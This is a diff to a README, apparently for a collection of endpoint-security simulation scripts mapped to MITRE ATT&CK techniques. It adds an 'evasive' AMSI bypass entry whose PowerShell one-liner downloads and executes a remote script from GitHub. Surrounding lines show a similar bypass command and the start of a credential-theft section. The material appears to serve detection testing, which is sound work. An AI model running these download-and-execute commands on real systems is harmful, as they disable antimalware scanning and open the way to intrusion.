@@ -47,6 +47,12 @@ https://attack.mitre.org/techniques/T1562/001/
 
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-AMSI1.ps1"); Invoke-AmsiBypass1;`
 
+### 2. DllCanUnloadNowAddress (AmsiScanBuffer) Evasive
+A more evasive variant that also identifies AmsiScanBuffer function through a method called egg hunting
+
+`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-AMSI2.ps1"); Invoke-bypass2;`
+
+
 ## Credentials Theft
 Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system,depending on the operating system or application holding the credentials. There are also specific applications that store passwords to make it easier for users manage and maintain. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.
 https://attack.mitre.org/techniques/T1555/
